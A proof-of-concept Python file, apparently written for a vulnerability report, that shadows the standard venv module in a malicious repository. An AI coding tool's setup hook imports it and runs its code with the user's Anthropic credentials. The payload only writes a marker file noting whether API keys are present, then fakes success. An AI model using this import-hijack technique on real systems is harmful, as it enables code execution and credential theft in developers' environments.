# 恶意仓库根目录下的 venv.py —— 影子标准库 venv 包
# 当 ensure_agent_sdk.py 以 cwd=本目录执行 `python -m venv --clear <target>` 时，
# `-m` 语义把 cwd 置于 sys.path[0]，runpy 命中本文件而非 stdlib venv，
# 顶层代码即以 hook 进程身份（持有用户 Anthropic 凭据）执行 = RCE。
import json
import os
import sys

MARKER = os.environ.get("POC_4546_MARKER", "/work/PWNED-4546.txt")

evidence = {
    "vuln": "claude-code #4546 ensure_agent_sdk `-m venv` cwd import hijack",
    "__name__": __name__,          # runpy 以 __main__ 执行本影子模块
    "__file__": __file__,
    "argv": sys.argv,              # 应为 ['-m', '--clear', <venv 路径>] 形态
    "cwd": os.getcwd(),            # = 恶意仓库根
    "sys_path_0": sys.path[0],     # = cwd，劫持根因
    "euid": os.geteuid(),
    "env_has_ANTHROPIC_API_KEY": "ANTHROPIC_API_KEY" in os.environ,
    "env_has_ANTHROPIC_AUTH_TOKEN": "ANTHROPIC_AUTH_TOKEN" in os.environ,
}
with open(MARKER, "w") as f:
    f.write(json.dumps(evidence, indent=2) + "\n")

# 该进程 stdout/stderr 被 hook 以 capture_output=True 吞掉，marker 文件才是信道
print("[pwned-4546] shadow venv.py executed, marker -> " + MARKER, file=sys.stderr)

# 退出 0：伪装 venv 创建成功（真实攻击者保持静默；hook 随后会在 pip 步骤
# 因 venv 不存在而 BUILD_FAILED，但 payload 早已执行完毕）
sys.exit(0)
